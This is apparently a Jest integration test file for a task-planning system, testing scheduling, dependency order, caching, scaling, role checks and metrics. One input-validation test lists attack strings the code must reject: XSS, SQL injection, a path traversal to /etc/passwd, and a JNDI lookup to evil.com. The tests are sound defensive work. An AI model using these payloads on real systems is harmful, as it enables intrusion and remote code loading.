/**
 * Integration tests for Quantum Task Planning System
 */

const { QuantumTaskPlanner } = require('../../src/quantum/quantumTaskPlanner');
const { LangObservatory } = require('../../src/index');

describe('Quantum Task Planning Integration', () => {
  let observatory;
  let planner;

  beforeAll(async () => {
    // Initialize with test configuration
    const config = {
      quantum: {
        maxStates: 8,
        errorHandling: {
          circuitBreakerThreshold: 5,
          circuitBreakerTimeout: 10000,
        },
        validation: {
          maxTasksPerBatch: 500,
          maxPlanningTime: 30000,
        },
        performance: {
          maxCacheEntries: 2000,
          cacheTTL: 600000,
          enableCompression: true,
          batchSize: 25,
        },
        scaling: {
          minInstances: 2,
          maxInstances: 5,
          targetCpuUtilization: 0.8,
        },
      },
      logging: {
        level: 'info',
      },
    };

    observatory = new LangObservatory(config);
    await observatory.initialize();

    planner = observatory.quantumPlanner;
  });

  afterAll(async () => {
    if (observatory) {
      await observatory.shutdown();
    }
  });

  describe('End-to-End Task Planning Workflow', () => {
    test('should complete full workflow from planning to execution', async () => {
      // Define a realistic task set
      const tasks = [
        {
          id: 'data-ingestion',
          type: 'data_processing',
          priority: 0.9,
          estimatedDuration: 120,
          requiredResources: ['cpu', 'memory', 'network'],
          complexity: 'medium',
        },
        {
          id: 'feature-extraction',
          type: 'ml_processing',
          priority: 0.8,
          estimatedDuration: 180,
          requiredResources: ['cpu', 'memory', 'gpu'],
          dependencies: ['data-ingestion'],
          complexity: 'high',
        },
        {
          id: 'model-training',
          type: 'ml_training',
          priority: 0.95,
          estimatedDuration: 300,
          requiredResources: ['gpu', 'memory'],
          dependencies: ['feature-extraction'],
          complexity: 'high',
        },
        {
          id: 'model-validation',
          type: 'validation',
          priority: 0.7,
          estimatedDuration: 60,
          requiredResources: ['cpu'],
          dependencies: ['model-training'],
          complexity: 'low',
        },
        {
          id: 'report-generation',
          type: 'reporting',
          priority: 0.6,
          estimatedDuration: 45,
          requiredResources: ['cpu', 'disk'],
          dependencies: ['model-validation'],
          complexity: 'low',
        },
      ];

      const constraints = {
        maxConcurrency: 3,
        deadline: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(), // 24 hours
        resourceAvailability: 0.8,
      };

      // Step 1: Plan tasks
      const planResult = await observatory.planTasks(tasks, constraints);

      expect(planResult).toBeDefined();
      expect(planResult.quantumPlan).toBeDefined();
      expect(planResult.adaptiveSchedules).toBeDefined();
      expect(planResult.totalDuration).toBeGreaterThan(0);
      expect(planResult.efficiency).toBeGreaterThan(0);

      // Verify dependency ordering is maintained
      const phases = planResult.quantumPlan.phases;
      expect(phases.length).toBeGreaterThan(0);

      // Step 2: Execute planned tasks
      const executionResults = [];
      for (const schedule of planResult.adaptiveSchedules) {
        const result = await observatory.executeTask(schedule.task.id, {
          schedule: schedule.schedule,
          timeout: schedule.task.estimatedDuration * 1000 * 1.5,
        });
        executionResults.push(result);
      }

      // Verify all tasks executed
      expect(executionResults).toHaveLength(tasks.length);
      executionResults.forEach(result => {
        expect(result.success).toBeDefined();
        expect(result.duration).toBeGreaterThan(0);
      });

      // Step 3: Verify metrics were recorded
      const metrics = await planner.getQuantumMetrics();
      expect(metrics.executionHistory).toBeGreaterThan(0);
      expect(metrics.avgEfficiency).toBeGreaterThan(0);
    });

    test('should handle complex dependency graphs', async () => {
      const complexTasks = [
        { id: 'A', dependencies: [] },
        { id: 'B', dependencies: ['A'] },
        { id: 'C', dependencies: ['A'] },
        { id: 'D', dependencies: ['B', 'C'] },
        { id: 'E', dependencies: ['B'] },
        { id: 'F', dependencies: ['D', 'E'] },
        { id: 'G', dependencies: ['C'] },
        { id: 'H', dependencies: ['F', 'G'] },
      ].map(task => ({
        ...task,
        priority: Math.random() * 0.5 + 0.5,
        estimatedDuration: Math.floor(Math.random() * 60) + 30,
        type: 'computation',
      }));

      const planResult = await observatory.planTasks(complexTasks);

      expect(planResult).toBeDefined();
      expect(planResult.quantumPlan.phases.length).toBeGreaterThan(1);

      // Verify topological ordering
      const executionOrder = planResult.quantumPlan.phases.flatMap(phase =>
        phase.tasks.map(t => t.id)
      );

      // Check that dependencies come before dependents
      const getIndex = id => executionOrder.indexOf(id);
      expect(getIndex('A')).toBeLessThan(getIndex('B'));
      expect(getIndex('A')).toBeLessThan(getIndex('C'));
      expect(getIndex('B')).toBeLessThan(getIndex('D'));
      expect(getIndex('C')).toBeLessThan(getIndex('D'));
    });
  });

  describe('Performance and Scalability', () => {
    test('should handle high-volume task planning', async () => {
      const highVolumeTasks = Array.from({ length: 200 }, (_, i) => ({
        id: `task-${i}`,
        type: 'computation',
        priority: Math.random(),
        estimatedDuration: Math.floor(Math.random() * 120) + 30,
        requiredResources: ['cpu'],
        complexity: i % 3 === 0 ? 'high' : i % 3 === 1 ? 'medium' : 'low',
      }));

      const startTime = Date.now();
      const planResult = await observatory.planTasks(highVolumeTasks);
      const planningDuration = Date.now() - startTime;

      expect(planResult).toBeDefined();
      expect(planningDuration).toBeLessThan(20000); // Should complete within 20 seconds
      expect(planResult.quantumPlan.phases.length).toBeGreaterThan(0);
    });

    test('should demonstrate caching effectiveness', async () => {
      const standardTasks = [
        {
          id: 'cache-test-1',
          priority: 0.7,
          estimatedDuration: 60,
          type: 'standard',
        },
        {
          id: 'cache-test-2',
          priority: 0.6,
          estimatedDuration: 45,
          type: 'standard',
        },
      ];
      const constraints = { maxConcurrency: 2 };

      // First execution (cache miss)
      const start1 = Date.now();
      await observatory.planTasks(standardTasks, constraints);
      const duration1 = Date.now() - start1;

      // Second execution (should hit cache)
      const start2 = Date.now();
      await observatory.planTasks(standardTasks, constraints);
      const duration2 = Date.now() - start2;

      // Cache hit should be significantly faster
      expect(duration2).toBeLessThan(duration1 * 0.5);
    });

    test('should scale instances under load', async () => {
      const loadTasks = Array.from({ length: 50 }, (_, i) => ({
        id: `load-task-${i}`,
        priority: 0.5,
        estimatedDuration: 30,
        type: 'computation',
      }));

      // Execute multiple planning requests concurrently to trigger scaling
      const concurrentRequests = Array.from({ length: 10 }, () =>
        observatory.planTasks(loadTasks)
      );

      const results = await Promise.allSettled(concurrentRequests);

      // Most requests should succeed
      const successCount = results.filter(r => r.status === 'fulfilled').length;
      expect(successCount).toBeGreaterThan(7); // At least 70% success rate

      // Check that scaling occurred
      const scalingMetrics = await planner.getQuantumMetrics();
      expect(scalingMetrics.scalingMetrics?.instances?.total).toBeGreaterThan(
        1
      );
    });
  });

  describe('Error Handling and Resilience', () => {
    test('should recover from component failures', async () => {
      const tasks = [
        { id: 'resilience-test', priority: 0.8, estimatedDuration: 60 },
      ];

      // Simulate various failure scenarios
      const failureScenarios = [
        () => {
          planner.quantumState.set('coherence', 0.01);
        }, // Quantum coherence loss
        () => {
          planner.quantumState.clear();
        }, // State corruption
      ];

      for (const simulateFailure of failureScenarios) {
        simulateFailure();

        // Should still produce a plan (via error recovery)
        const result = await observatory.planTasks(tasks);
        expect(result).toBeDefined();

        // Reset for next test
        await planner.initialize();
      }
    });

    test('should handle rate limiting gracefully', async () => {
      const quickTasks = [
        { id: 'rate-test', priority: 0.5, estimatedDuration: 10 },
      ];

      // Make many rapid requests to trigger rate limiting
      const rapidRequests = Array.from({ length: 20 }, (_, i) =>
        observatory.planTasks([{ ...quickTasks[0], id: `rate-test-${i}` }])
      );

      const results = await Promise.allSettled(rapidRequests);

      // Some requests might be rate limited, but system should remain stable
      expect(results.length).toBe(20);

      // At least some should succeed
      const successCount = results.filter(r => r.status === 'fulfilled').length;
      expect(successCount).toBeGreaterThan(0);
    });
  });

  describe('Security Integration', () => {
    test('should enforce authentication and authorization', async () => {
      const tasks = [
        { id: 'secure-task', priority: 0.7, estimatedDuration: 60 },
      ];

      // Test with different user roles
      const testUsers = [
        { userId: 'admin', role: 'admin' },
        { userId: 'planner', role: 'planner' },
        { userId: 'viewer', role: 'viewer' },
      ];

      for (const user of testUsers) {
        if (user.role === 'viewer') {
          // Viewers should not be able to plan tasks
          await expect(planner.planTasks(tasks, {}, user)).rejects.toThrow(
            /Insufficient permissions/
          );
        } else {
          // Admins and planners should be able to plan
          const result = await planner.planTasks(tasks, {}, user);
          expect(result).toBeDefined();
        }
      }
    });

    test('should sanitize and validate all inputs', async () => {
      const maliciousInputs = [
        { id: '<script>alert("xss")</script>', priority: 0.5 },
        { id: 'task"; DROP TABLE tasks;--', priority: 0.5 },
        { id: '../../../etc/passwd', priority: 0.5 },
        { id: '${jndi:ldap://evil.com/payload}', priority: 0.5 },
      ];

      // All malicious inputs should be rejected or sanitized
      await expect(planner.planTasks(maliciousInputs)).rejects.toThrow(
        /Validation failed/
      );
    });
  });

  describe('Monitoring and Observability', () => {
    test('should generate comprehensive metrics', async () => {
      const tasks = [
        { id: 'metrics-test-1', priority: 0.8, estimatedDuration: 60 },
        { id: 'metrics-test-2', priority: 0.6, estimatedDuration: 45 },
      ];

      await observatory.planTasks(tasks);
      await observatory.executeTask('metrics-test-1');

      // Check health status
      const health = await observatory.getHealthStatus();
      expect(health.status).toMatch(/healthy|degraded/);
      expect(health.services.quantumPlanner).toBeDefined();
      expect(health.services.adaptiveScheduler).toBeDefined();

      // Check quantum metrics
      const metrics = await planner.getQuantumMetrics();
      expect(metrics.coherenceLevel).toBeDefined();
      expect(metrics.superpositionStates).toBeDefined();
      expect(metrics.executionHistory).toBeGreaterThan(0);
      expect(metrics.validationMetrics).toBeDefined();
      expect(metrics.errorMetrics).toBeDefined();
    });

    test('should track execution history and trends', async () => {
      const tasks = [
        { id: 'history-test', priority: 0.7, estimatedDuration: 30 },
      ];

      // Execute multiple planning cycles
      for (let i = 0; i < 3; i++) {
        await observatory.planTasks([{ ...tasks[0], id: `history-test-${i}` }]);
      }

      const metrics = await planner.getQuantumMetrics();
      expect(metrics.executionHistory).toBe(3);
      expect(metrics.avgEfficiency).toBeGreaterThan(0);
    });
  });

  describe('Real-world Scenarios', () => {
    test('should handle ML pipeline scenario', async () => {
      const mlPipelineTasks = [
        {
          id: 'data-validation',
          type: 'validation',
          priority: 0.9,
          estimatedDuration: 30,
          requiredResources: ['cpu', 'memory'],
        },
        {
          id: 'data-preprocessing',
          type: 'preprocessing',
          priority: 0.8,
          estimatedDuration: 90,
          requiredResources: ['cpu', 'memory'],
          dependencies: ['data-validation'],
        },
        {
          id: 'feature-engineering',
          type: 'feature_engineering',
          priority: 0.8,
          estimatedDuration: 120,
          requiredResources: ['cpu', 'memory'],
          dependencies: ['data-preprocessing'],
        },
        {
          id: 'model-training',
          type: 'training',
          priority: 0.95,
          estimatedDuration: 600,
          requiredResources: ['gpu', 'memory'],
          dependencies: ['feature-engineering'],
        },
        {
          id: 'model-evaluation',
          type: 'evaluation',
          priority: 0.7,
          estimatedDuration: 60,
          requiredResources: ['cpu'],
          dependencies: ['model-training'],
        },
        {
          id: 'model-deployment',
          type: 'deployment',
          priority: 0.9,
          estimatedDuration: 45,
          requiredResources: ['network', 'cpu'],
          dependencies: ['model-evaluation'],
        },
      ];

      const constraints = {
        maxConcurrency: 2,
        deadline: new Date(Date.now() + 4 * 60 * 60 * 1000).toISOString(), // 4 hours
        resourceAvailability: 0.7,
      };

      const planResult = await observatory.planTasks(
        mlPipelineTasks,
        constraints
      );

      expect(planResult).toBeDefined();
      expect(planResult.quantumPlan.efficiency).toBeGreaterThan(0.3);
      expect(planResult.totalDuration).toBeLessThan(14400000); // Less than 4 hours in ms

      // Verify critical path is optimized
      const phases = planResult.quantumPlan.phases;
      expect(phases.length).toBeGreaterThanOrEqual(4); // At least 4 sequential phases
    });

    test('should handle microservices deployment scenario', async () => {
      const deploymentTasks = Array.from({ length: 15 }, (_, i) => ({
        id: `service-${i}`,
        type: 'deployment',
        priority: Math.random() * 0.3 + 0.7, // High priority
        estimatedDuration: Math.floor(Math.random() * 60) + 30,
        requiredResources: ['network', 'cpu'],
        dependencies: i > 0 && i % 3 === 0 ? [`service-${i - 1}`] : [],
      }));

      const constraints = {
        maxConcurrency: 5, // Parallel deployment capacity
        deadline: new Date(Date.now() + 30 * 60 * 1000).toISOString(), // 30 minutes
      };

      const planResult = await observatory.planTasks(
        deploymentTasks,
        constraints
      );

      expect(planResult).toBeDefined();
      expect(planResult.quantumPlan.parallelism).toBeGreaterThan(0.3); // Good parallelization
      expect(planResult.totalDuration).toBeLessThan(1800000); // Less than 30 minutes
    });
  });
});
